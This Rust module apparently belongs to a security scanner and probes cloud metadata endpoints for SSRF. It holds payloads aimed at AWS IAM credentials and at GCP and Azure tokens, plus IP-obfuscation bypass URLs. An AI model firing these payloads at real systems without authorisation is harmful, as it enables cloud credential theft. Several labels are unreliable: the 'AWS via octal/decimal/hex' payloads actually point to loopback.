#![allow(dead_code)]

use crate::core::scanners::{Scanner, ScannerType};
use crate::shared::config::JackSparrowConfig;
use crate::shared::context::ScanContext;
use crate::shared::error::JackSparrowError;
use crate::shared::types::{Confidence, Evidence, Finding, Severity, VulnerabilityType};
use async_trait::async_trait;
use reqwest::Client;

pub struct CloudMetadataScanner;

impl CloudMetadataScanner {
    pub fn new(_config: &JackSparrowConfig) -> Self {
        Self
    }

    /// Build HTTP client with context headers
    fn build_client(&self, context: &ScanContext) -> Result<Client, JackSparrowError> {
        let mut builder = Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .redirect(reqwest::redirect::Policy::none());

        let mut headers = reqwest::header::HeaderMap::new();
        for (key, value) in &context.headers {
            if let (Ok(k), Ok(v)) = (
                reqwest::header::HeaderName::from_bytes(key.as_bytes()),
                reqwest::header::HeaderValue::from_str(value),
            ) {
                headers.insert(k, v);
            }
        }
        headers.insert(
            "User-Agent",
            reqwest::header::HeaderValue::from_static("JackSparrow/0.3.0"),
        );
        builder = builder.default_headers(headers);

        builder.build().map_err(|e| JackSparrowError::ToolExecutionFailed {
            tool: "cloud-metadata".to_string(),
            message: e.to_string(),
        })
    }

    /// Test cloud metadata endpoints via direct SSRF
    ///
    /// If the target accepts a URL parameter and fetches it server-side,
    /// we can probe cloud metadata endpoints. This scanner sends requests
    /// directly to the metadata IPs to check if they're reachable from the scanner,
    /// and also tests common SSRF parameter patterns.
    async fn test_metadata_endpoints(
        &self,
        target: &str,
        client: &Client,
    ) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Cloud metadata endpoints (IP: path pairs)
        let endpoints: Vec<(&str, &str, &str, Severity)> = vec![
            // AWS IMDSv1
            ("169.254.169.254", "/latest/meta-data/", "AWS IMDSv1 (instance metadata)", Severity::Critical),
            ("169.254.169.254", "/latest/meta-data/iam/security-credentials/", "AWS IAM credentials via metadata", Severity::Critical),
            ("169.254.169.254", "/latest/meta-data/instance-id", "AWS instance ID disclosure", Severity::High),
            ("169.254.169.254", "/latest/meta-data/hostname", "AWS hostname disclosure", Severity::Medium),
            ("169.254.169.254", "/latest/user-data/", "AWS user-data exposure", Severity::Critical),
            ("169.254.169.254", "/latest/dynamic/instance-identity/document", "AWS instance identity document", Severity::High),
            // GCP metadata
            ("169.254.169.254", "/computeMetadata/v1/", "GCP metadata (require Metadata-Header)", Severity::Critical),
            ("169.254.169.254", "/computeMetadata/v1/instance/service-accounts/default/token", "GCP service account token", Severity::Critical),
            ("169.254.169.254", "/computeMetadata/v1/project/project-id", "GCP project ID", Severity::High),
            ("169.254.169.254", "/computeMetadata/v1/instance/name", "GCP instance name", Severity::Medium),
            // Azure metadata
            ("169.254.169.254", "/metadata/instance?api-version=2021-02-01", "Azure instance metadata", Severity::Critical),
            ("169.254.169.254", "/metadata/identity/oauth2/token?api-version=2018-07-01&resource=https://management.azure.com/", "Azure managed identity token", Severity::Critical),
            // Kubernetes
            ("169.254.169.254", "/api/v1/namespaces", "Kubernetes API (metadata)", Severity::Critical),
            ("169.254.169.254", "/secrets/", "Kubernetes secrets via metadata", Severity::Critical),
            // DigitalOcean
            ("169.254.169.254", "/metadata/v1/", "DigitalOcean metadata", Severity::High),
        ];

        for (ip, path, description, severity) in endpoints {
            let url = format!("http://{}{}", ip, path);
            match client.get(&url).send().await {
                Ok(resp) => {
                    let status = resp.status();
                    if status.is_success() || status.as_u16() == 401 || status.as_u16() == 403 {
                        // 200 = accessible, 401/403 = endpoint exists but requires auth
                        let confidence = if status.is_success() {
                            Confidence::Confirmed
                        } else {
                            Confidence::Likely
                        };

                        let finding = Finding {
                            id: uuid::Uuid::new_v4(),
                            vulnerability_type: VulnerabilityType::Ssrf,
                            severity: severity.clone(),
                            confidence,
                            title: format!("Cloud metadata accessible: {}", description),
                            description: format!(
                                "The cloud metadata endpoint at {}{} responded with HTTP {}. \
                                 This {} endpoint can be exploited via SSRF to steal cloud credentials, \
                                 instance data, and tokens.",
                                ip, path, status,
                                if status.is_success() { "UNAUTHENTICATED" } else { "authenticated" }
                            ),
                            url: target.to_string(),
                            parameter: Some(format!("SSRF -> {}{}", ip, path)),
                            evidence: Evidence {
                                request: Some(format!("GET {} HTTP/1.1\r\nHost: {}", path, ip)),
                                response: Some(format!("HTTP {} {}", status.as_u16(), status.canonical_reason().unwrap_or("Unknown"))),
                                payload: Some(format!("http://{}{}", ip, path)),
                                pattern: Some(description.to_string()),
                                context: Some(format!("Direct cloud metadata access from scanner")),
                            },
                            remediation: format!(
                                "1. Block SSRF to internal networks (RFC 1918, 169.254.0.0/16)\n\
                                 2. Use IMDSv2 on AWS (requires session token)\n\
                                 3. Restrict cloud metadata access with firewall rules\n\
                                 4. Use network segmentation to isolate application servers\n\
                                 5. Implement URL allowlists for server-side fetch operations"
                            ),
                            references: vec![
                                "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html".to_string(),
                                "https://cloud.google.com/compute/docs/storing-retrieving-metadata".to_string(),
                                "https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service".to_string(),
                                "https://cwe.mitre.org/data/definitions/918.html".to_string(),
                            ],
                            timestamp: chrono::Utc::now(),
                            cvss_score: Some(match severity {
                                Severity::Critical => 9.8,
                                Severity::High => 8.5,
                                Severity::Medium => 6.5,
                                _ => 5.0,
                            }),
                            cwe_id: Some("CWE-918".to_string()),
                            tool_source: "cloud-metadata-scanner".to_string(),
                        };
                        findings.push(finding);
                    }
                }
                Err(_) => {
                    // Connection refused or timeout = endpoint not reachable (expected)
                }
            }
        }

        findings
    }

    /// Test SSRF via URL parameters that might fetch cloud metadata
    ///
    /// Sends the target URL with common SSRF payloads appended to URL parameters
    /// and checks if the response contains cloud metadata indicators.
    async fn test_url_parameter_ssrf(
        &self,
        target: &str,
        client: &Client,
    ) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Parse the target URL to find parameters
        let url = match url::Url::parse(target) {
            Ok(u) => u,
            Err(_) => return findings,
        };

        let params: Vec<(String, String)> = url.query_pairs().map(|(k, v)| (k.to_string(), v.to_string())).collect();

        if params.is_empty() {
            return findings;
        }

        // SSRF payloads targeting cloud metadata
        let ssrf_payloads = vec![
            ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
            ("http://169.254.169.254/computeMetadata/v1/", "GCP metadata"),
            ("http://[::ffff:169.254.169.254]/latest/meta-data/", "AWS via IPv6"),
            ("http://0177.0.0.1/latest/meta-data/", "AWS via octal IP"),
            ("http://2130706433/latest/meta-data/", "AWS via decimal IP"),
            ("http://0x7f000001/latest/meta-data/", "AWS via hex IP"),
        ];

        for (param_name, _) in &params {
            for (payload, description) in &ssrf_payloads {
                // Build URL with SSRF payload
                let mut test_url = url.clone();
                let query: Vec<String> = url
                    .query_pairs()
                    .map(|(k, v)| {
                        if k == *param_name {
                            format!("{}={}", k, payload)
                        } else {
                            format!("{}={}", k, v)
                        }
                    })
                    .collect();
                test_url.set_query(Some(&query.join("&")));

                match client.get(test_url.as_str()).send().await {
                    Ok(resp) => {
                        if resp.status().is_success() {
                            let body = resp.text().await.unwrap_or_default();
                            // Check for cloud metadata indicators
                            let indicators = [
                                "instance-id",
                                "instance-type",
                                "ami-id",
                                "security-credentials",
                                "iam/security-credentials",
                                "metadata",
                                "project-id",
                                "vmId",
                                "subscriptionId",
                            ];

                            for indicator in &indicators {
                                if body.to_lowercase().contains(&indicator.to_lowercase()) {
                                    let finding = Finding {
                                        id: uuid::Uuid::new_v4(),
                                        vulnerability_type: VulnerabilityType::Ssrf,
                                        severity: Severity::Critical,
                                        confidence: Confidence::Confirmed,
                                        title: format!("SSRF to cloud metadata via parameter '{}'", param_name),
                                        description: format!(
                                            "The '{}' parameter at {} accepts a URL and fetches it server-side. \
                                             Payload '{}' was used to access cloud metadata ({}). \
                                             Response contained '{}'.",
                                            param_name, target, payload, description, indicator
                                        ),
                                        url: target.to_string(),
                                        parameter: Some(param_name.clone()),
                                        evidence: Evidence {
                                            request: Some(format!("GET {} HTTP/1.1", test_url)),
                                            response: Some(body.chars().take(500).collect()),
                                            payload: Some(payload.to_string()),
                                            pattern: Some(indicator.to_string()),
                                            context: Some(format!("SSRF via URL parameter")),
                                        },
                                        remediation: format!(
                                            "1. Validate and sanitize URL inputs\n\
                                             2. Use allowlists for permitted domains\n\
                                             3. Block requests to internal networks (RFC 1918, 169.254.0.0/16)\n\
                                             4. Use IMDSv2 on AWS (requires session token)\n\
                                             5. Implement network segmentation"
                                        ),
                                        references: vec![
                                            "https://cwe.mitre.org/data/definitions/918.html".to_string(),
                                            "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html".to_string(),
                                        ],
                                        timestamp: chrono::Utc::now(),
                                        cvss_score: Some(9.8),
                                        cwe_id: Some("CWE-918".to_string()),
                                        tool_source: "cloud-metadata-scanner".to_string(),
                                    };
                                    findings.push(finding);
                                    return findings;
                                }
                            }
                        }
                    }
                    Err(_) => {}
                }
            }
        }

        findings
    }
}

#[async_trait]
impl Scanner for CloudMetadataScanner {
    fn scanner_type(&self) -> ScannerType {
        ScannerType::CloudMetadata
    }

    async fn scan(
        &self,
        target: &str,
        _config: &JackSparrowConfig,
        context: &ScanContext,
    ) -> Result<Vec<Finding>, JackSparrowError> {
        let client = self.build_client(context)?;

        // Run both tests concurrently
        let (direct_findings, param_findings) = tokio::join!(
            self.test_metadata_endpoints(target, &client),
            self.test_url_parameter_ssrf(target, &client)
        );

        let mut all_findings = direct_findings;
        all_findings.extend(param_findings);

        Ok(all_findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_context() -> ScanContext {
        ScanContext {
            cookies: None,
            headers: Vec::new(),
            session: None,
        }
    }

    fn make_config() -> JackSparrowConfig {
        JackSparrowConfig::default()
    }

    #[test]
    fn scanner_type_is_cloud_metadata() {
        let scanner = CloudMetadataScanner::new(&make_config());
        assert_eq!(scanner.scanner_type(), ScannerType::CloudMetadata);
    }

    #[test]
    fn build_client_uses_context_headers() {
        let scanner = CloudMetadataScanner::new(&make_config());
        let mut ctx = make_context();
        ctx.headers.push(("X-Custom".to_string(), "test-value".to_string()));
        let client = scanner.build_client(&ctx);
        assert!(client.is_ok());
    }

    #[tokio::test]
    async fn scan_returns_findings_or_empty() {
        let scanner = CloudMetadataScanner::new(&make_config());
        let ctx = make_context();
        let config = make_config();
        // Use localhost with closed port for fast connection refused
        let result = scanner.scan("http://127.0.0.1:19999", &config, &ctx).await;
        assert!(result.is_ok());
    }

    #[test]
    fn endpoint_list_covers_aws_gcp_azure() {
        let _scanner = CloudMetadataScanner::new(&make_config());
        let endpoints = vec![
            ("169.254.169.254", "/latest/meta-data/"),
            ("169.254.169.254", "/computeMetadata/v1/"),
            ("169.254.169.254", "/metadata/instance?api-version=2021-02-01"),
        ];
        // Verify all three cloud providers are covered
        assert_eq!(endpoints.len(), 3);
    }

    #[test]
    fn ip_obfuscation_payloads_are_valid() {
        let payloads = vec![
            "http://0177.0.0.1/latest/meta-data/",
            "http://2130706433/latest/meta-data/",
            "http://0x7f000001/latest/meta-data/",
            "http://[::ffff:169.254.169.254]/latest/meta-data/",
        ];
        // All payloads should be parseable URLs
        for payload in &payloads {
            assert!(url::Url::parse(payload).is_ok(), "Invalid URL: {}", payload);
        }
    }
}
